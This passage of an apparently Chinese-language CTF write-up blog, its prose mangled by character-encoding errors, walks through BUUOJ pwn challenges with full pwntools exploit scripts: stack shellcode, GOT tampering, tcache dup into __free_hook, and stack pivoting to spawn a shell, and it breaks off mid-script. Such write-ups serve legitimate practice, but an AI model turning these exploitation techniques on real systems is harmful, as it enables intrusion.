class="hljs-number">0x804A014</span>:rce&#125;,write_size = <span class="hljs-string">"byte"</span>,numbwritten = <span class="hljs-number">10</span>)sla(<span class="hljs-string">'me:'</span>,payload)itr()</code></pre></div><h2 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a><code>pwnable_start</code></h2><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œä½œè€…è‡ªå·±æ±‡ç¼–å†™çš„ç¨‹åºã€‚<br>åˆ†ææ±‡ç¼–ä»¥åå¯ä»¥è®¤ä¸ºå°±æ˜¯ï¼š</p><div class="hljs"><pre><code class="hljs c">write(<span class="hljs-number">1</span>,esp,<span class="hljs-number">20</span>)read(<span class="hljs-number">0</span>,esp,<span class="hljs-number">60</span>)</code></pre></div><p>ååˆ†æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯éš¾ç‚¹åœ¨shellcodeæ‘†ä¸Šæ ˆä»¥åï¼Œå¦‚ä½•è·³è½¬è¿‡å»æ‰§è¡Œã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ul><li>åˆ©ç”¨æ§åˆ¶eipï¼Œè¿”å›wirteå¤„ï¼Œæ³„æ¼ä¸€ä¸‹æ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºespçš„åœ°å€</li><li>æ‘†shellcodeä¸Šæ ˆï¼Œæ§åˆ¶å¥½eip</li></ul><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./start'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27834</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)sa(<span class="hljs-string">":"</span>,payload)new_esp = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">4</span>addr_shellcode = new_esp + <span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>info_addr(<span class="hljs-string">'new esp'</span>,new_esp)shellcode  = <span class="hljs-string">"\x31\xc0\x50\x68\x2f\x2f\x73"</span>shellcode += <span class="hljs-string">"\x68\x68\x2f\x62\x69\x6e\x89"</span>shellcode += <span class="hljs-string">"\xe3\x89\xc1\x89\xc2\xb0\x0b"</span>shellcode += <span class="hljs-string">"\xcd\x80\x31\xc0\x40\xcd\x80"</span>s(<span class="hljs-string">'a'</span> * <span class="hljs-number">0x14</span> + p32(addr_shellcode) + shellcode)itr()</code></pre></div><p>Shell code ç½‘ä¸Šä¸€æ‰¾æœ‰å¾ˆå¤šï¼Œæ‰¾åˆ°ä¸€ä¸ªåˆé€‚å­—èŠ‚é™åˆ¶ï¼Œä¸”å¯ä»¥æ‰§è¡Œçš„å³å¯ã€‚</p><h2 id="inndy-rop"><a href="#inndy-rop" class="headerlink" title="inndy_rop"></a><code>inndy_rop</code></h2><p>åšæ³•è·Ÿ <code>cmcc_simplerop</code>åŸºæœ¬ä¸€æ ·ï¼Œé™¤äº†åç§»ã€‚</p><p>32ä½ä¸‹ï¼Œ<code>sys_execve(&quot;sh&quot;, 0, 0, 0)</code> è¡Œä¸é€šã€‚ï¼ˆä¸Šæ¥æµ‹è¯•è¿™ä¸ªï¼Œæµ‹è¯•ä¸€é˜µå­ï¼‰</p><h2 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="BJDCTF 2nd secret"></a>BJDCTF 2nd secret</h2><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ…¢æ…¢åˆ†æå¯ä»¥å‘ç°ä¸€ä¸ªæº¢å‡ºç‚¹ï¼Œä¸”åˆ©ç”¨æ­¤å¤„åªæ˜¯å¯ä»¥åšåˆ°ä»»æ„åœ°å€çš„æ•°æ®å‡1ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/MX0AfS.png" srcset="/img/loading.gif" alt></p><p>ç„¶åæƒ³åˆ°å¯ä»¥åœ¨gotè¡¨å¤„ä¸‹æ‰‹ï¼Œ<strong>å…¶ä¸­printfã€systemå‡½æ•°åœ¨ç¨‹åºè¾¾åˆ°ä¸€å®šæ¡ä»¶æ‰ä¼šè¿è¡Œã€‚æ‰€ä»¥å…¶gotå¤„çš„å€¼æ˜¯ç‰¹å®šçš„ï¼Œå¹¶ä¸”æ˜¯ç›¸è¿‘çš„ã€‚</strong></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/XkCKMA.png" srcset="/img/loading.gif" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œç›¸å·®10ã€‚ç„¶ååˆ©ç”¨åŸæ¥çš„æº¢å‡ºç‚¹ï¼Œæ”¾å…¥printfçš„gotè¡¨åœ°å€ï¼Œè®©å…¶å‡10æ¬¡1ï¼Œä¹Ÿå°±æ˜¯ç­”å¯¹10æ¬¡serectåï¼Œè®©ç¨‹åºèµ°å‘ç»“æŸå¤„ï¼Œè°ƒç”¨printfã€‚å…¶printfçš„bufæ‰“å°çš„æ˜¯nameï¼Œè¿™ä¸ªæ˜¯å¯æ§çš„ï¼Œå†™æˆ<code>/bin/sh\x00</code>å³å¯ã€‚</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./secret'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29635</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload = <span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">"\x00"</span> * <span class="hljs-number">8</span> + p64(elf.got[<span class="hljs-string">'printf'</span>])[:<span class="hljs-number">5</span>]<span class="hljs-comment">#æ­¤å¤„payload å› ä¸ºreadé‚£é‡Œè¯»çš„æ•°æ®å¤§å°é™åˆ¶ï¼Œéœ€è¦è°ƒæ•´ä¸€ä¸‹payloadçš„é•¿åº¦ã€‚</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">"What's your name?"</span>,payload)answer = [<span class="hljs-number">0x476B</span>,<span class="hljs-number">0x2D38</span>,<span class="hljs-number">0x4540</span>,<span class="hljs-number">0x3E77</span>,<span class="hljs-number">0x3162</span>,<span class="hljs-number">0x3F7D</span>,<span class="hljs-number">0x357A</span>,<span class="hljs-number">0x3CF5</span>,<span class="hljs-number">0x2F9E</span>,<span class="hljs-number">0x41EA</span>,<span class="hljs-number">0x48D8</span>,<span class="hljs-number">0x2763</span>,<span class="hljs-number">0x474C</span>,<span class="hljs-number">0x3809</span>,<span class="hljs-number">0x2E63</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(answer)):    print(answer[i])    sa(<span class="hljs-string">"Secret"</span>,str(answer[i]))sla(<span class="hljs-string">"Secret"</span>,<span class="hljs-string">'1'</span>)itr()</code></pre></div><h2 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a><code>ciscn_2019_es_1</code></h2><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>64ä½ï¼Œubuntu 18.  å­˜åœ¨ UAFï¼Œååˆ†ç®€å•çš„tcache dupæ”»å‡»ã€‚</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_es_1'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29639</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,call)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'call'</span>,str(call))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">call</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x500</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#1</span><span class="hljs-comment"># debug()</span>call(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'name:\n'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)<span class="hljs-comment">#get libc</span>add(<span class="hljs-number">0x510</span><span class="hljs-number">-0x20</span><span class="hljs-number">-0x10</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'chumen77'</span>) <span class="hljs-comment">#3</span>call(<span class="hljs-number">3</span>)call(<span class="hljs-number">3</span>)free_hook = libc_base + <span class="hljs-number">0x3ed8e8</span>add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>,p64(free_hook),p64(free_hook)) <span class="hljs-comment">#5</span>rec = rce18[<span class="hljs-number">1</span>] + libc_baseadd(<span class="hljs-number">0x20</span>,p64(rec),p64(rec))call(<span class="hljs-number">1</span>)itr()</code></pre></div><h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a><code>ciscn_2019_s_4</code></h2><h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vul</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+0h] [ebp-28h]</span>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>u);  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);  read(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x30</span>u);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hello, %s\n"</span>, &amp;s);&#125;</code></pre></div><ul><li>å­˜åœ¨æ ˆæº¢å‡ºï¼Œæº¢å‡º8ä¸ªå­—èŠ‚ï¼Œè€ƒè™‘æ ˆè½¬ç§»ã€‚</li><li>åœ¨å¡«å……bufï¼Œ <code>%s</code> åœ¨32ä½ç”¨äºæ³„æ¼æ ˆä¸Šçš„ä¿¡æ¯ã€‚</li></ul><p>æ‰€ä»¥å¯ä»¥è€ƒè™‘æ³„æ¼å¤„æ ˆåœ°å€ï¼Œlibcåœ°å€ã€‚ä»è€Œç®—å‡ºbufçš„baseä¸libc baseã€‚</p><p>é¦–å…ˆå¯ä»¥æ˜ç¡®ä¸€ç‚¹å¯ä»¥è¦†ç›–è¿”å›åœ°å€ï¼Œç¬¬ä¸€ä¸‹è€ƒè™‘ç›´æ¥è¦†ç›–ä¸º<code>one_gadget</code> æœ¬åœ°é€šè¿œç¨‹ä¸é€šã€‚</p><p>ç„¶åå°±è€ƒè™‘ç”¨æ ˆè½¬ç§»åˆ°bufä¸Šæ¥è·å–shellã€‚</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_s_4'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26932</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x28</span> - <span class="hljs-number">1</span> ) + <span class="hljs-string">'b'</span>sa(<span class="hljs-string">'name'</span>,payload)ru(<span class="hljs-string">"b"</span>)buf_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x38</span>r(<span class="hljs-number">4</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1fb9b0</span>info_addr(<span class="hljs-string">'stack'</span>,buf_base)info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = p32(<span class="hljs-number">0x8048450</span>) + p32(elf.plt[<span class="hljs-string">'system'</span>]) + p32(<span class="hljs-number">0x8048450</span>) + p32(buf_base+<span class="hljs-number">16</span>) + <span class="hljs-string">'/bin/sh\x00'</span>payload = payload.ljust((<span class="hljs-number">0x30</span><span class="hljs-number">-4</span><span class="hljs-number">-4</span><span class="hljs-number">-8</span>),<span class="hljs-string">'b'</span>) + p32(buf_base) *<span class="hljs-number">3</span>+ p32(<span class="hljs-number">0x80485FD</span>)s(payload)itr()</code></pre></div><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a><code>ciscn_2019_final_2</code></h2><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç¨‹åºå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿå¾ˆç»†èŠ‚ï¼Œç”±äºè‡ªå·±çš„é€†å‘èƒ½åŠ›æœ‰ç‚¹å·®ï¼Œæ²¡æœ‰æ³¨æ„éƒ¨åˆ†ç»†èŠ‚ï¼Œé€ æˆæ„é€ å †å—ï¼Œè¿›è¡Œleakå’Œæ”¹å†™æ—¶ï¼Œé€ æˆè¾ƒå¤§çš„å›°éš¾å’Œè¿·æƒ‘ã€‚</p><p>å¼€å¯äº†æ²™ç›’ä¸èƒ½get shellï¼š</p><div class="hljs"><pre><code class="hljs undefined">#  line  CODE  JT   JF      K# =================================#  <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch#  <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number#  <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span>#  <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A == execve) goto <span class="hljs-number">0007</span>#  <span class="hljs-number">0006</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW#  <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><h4 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>UAF</li></ul><p>æ¯”å¦‚ï¼š</p><h4 id="ç¨‹åºå¤„ï¼š"><a href="#ç¨‹åºå¤„ï¼š" class="headerlink" title="ç¨‹åºå¤„ï¼š"></a>ç¨‹åºå¤„ï¼š</h4><h5 id="addå‡½æ•°ï¼š"><a href="#addå‡½æ•°ï¼š" class="headerlink" title="addå‡½æ•°ï¼š"></a>addå‡½æ•°ï¼š</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> *v0; <span class="hljs-comment">// rbx</span>__int16 v1; <span class="hljs-comment">// ax</span></code></pre></div><div class="hljs"><pre><code class="hljs c">v0 = (<span class="hljs-keyword">int</span> *)int_pt;*v0 = get_atoi();*((_DWORD *)int_pt + <span class="hljs-number">2</span>) = *(_DWORD *)int_pt;</code></pre></div><div class="hljs"><pre><code class="hljs c">v1 = get_atoi();*(_WORD *)short_pt = v1;*((_WORD *)short_pt + <span class="hljs-number">4</span>) = *(_WORD *)short_pt;</code></pre></div><p>å¼€å§‹å¯¹æ•°æ®ç±»å‹çš„å¤§å°æ²¡æœ‰æ³¨æ„ï¼Œè¿™å‡ å¤„å†³å®šç€</p><ul><li>intå‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š4å­—èŠ‚çš„æ•°æ®</li><li>short int å‹å †å—æ—¶ï¼Œåªèƒ½å†™ä¸Š2å­—èŠ‚çš„æ•°æ®</li></ul><h5 id="showå‡½æ•°ï¼š"><a href="#showå‡½æ•°ï¼š" class="headerlink" title="showå‡½æ•°ï¼š"></a>showå‡½æ•°ï¼š</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">1</span> &amp;&amp; int_pt )    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your int type inode number :%d\n"</span>, *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)int_pt);  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">2</span> &amp;&amp; short_pt )    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"your short type inode number :%d\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)*(<span class="hljs-keyword">signed</span> __int16 *)short_pt);</code></pre></div><p>æ„å‘³ç€leakæ—¶ä¹Ÿæ˜¯åªèƒ½æ³„æ¼å‡ºéƒ¨åˆ†çš„å­—èŠ‚ï¼Œå¢åŠ åœ¨åˆ©ç”¨æ—¶çš„éš¾åº¦ï¼Œéœ€è¦åˆ©ç”¨åˆé€‚çš„å †å—è¿›è¡Œæ”»å‡»ï¼Œå…¶åˆé€‚æ˜¯æŒ‡ä¸Šé¢æœ‰æ®‹ç•™åˆé€‚çš„æ•°æ®ï¼Œç„¶åæ”¹æœ«å°¾å‡ ä¸ªå­—èŠ‚ã€‚</p><h4 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h4><p>scanfå‡½æ•°æ˜¯ä»stdinä¸­è¯»å–æ•°æ®ï¼Œä¸”åœ¨<code>__IO_2_stdio_</code> çš„ioç»“æ„ä½“å­˜åœ¨ä¸€ä¸ª<code>_fileno</code>çš„æ ‡è¯†ä½ï¼Œé»˜è®¤å€¼æ˜¯0ï¼Œè‹¥å°†å…¶æ”¹æˆå…¶ä»–çš„æ–‡ä»¶å·ï¼Œè°ƒç”¨scanfå‡½æ•°åœ¨è·å–æ—¶ï¼Œå°±ä¼šè·å–å¯¹åº”æ–‡ä»¶ã€‚</p><h4 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h4><ul><li>ç¨‹åºåªè®©ä½ åˆ†é…0x30æˆ–è€…0x20çš„å †å—ï¼Œå¦‚ä½•ä¼ªé€ å‡ºä¸€ä¸ªè‡³å°‘0x90çš„å †å—ï¼Œå¦‚ä½•é‡Šæ”¾åï¼Œæ¥æ³„æ¼libcã€‚</li><li>æ³„æ¼å‡ºæ¥çš„æ•°æ®ä¸æ˜¯å®Œæ•´çš„ï¼Œå¯å†™æ—¶åªèƒ½å†™ä¸Š2ã€4å­—èŠ‚</li></ul><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_2'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25252</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               